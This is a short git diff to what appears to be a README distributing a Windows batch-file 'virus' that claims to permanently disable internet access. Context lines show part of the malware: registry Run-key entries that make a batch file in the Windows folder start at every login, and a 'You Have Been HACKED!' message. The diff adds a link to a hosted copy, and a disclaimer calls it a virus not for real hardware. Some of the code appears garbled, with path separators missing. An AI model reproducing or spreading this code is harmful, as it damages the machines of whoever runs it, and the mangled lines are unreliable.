@@ -12,6 +12,10 @@ hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg
 hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
 PAUSE
 ```
+# URL
+```url
+https://oceanofanythingofficial.github.io/disable-internet-parmanently-bat-file-virus/
+```
 # Disclaimer
 This Is Not A Toy. This Is A Virus. Dont Try It On Any Real Hardware. I Am Not Responsible for Any Misuse Of This Virus.
 
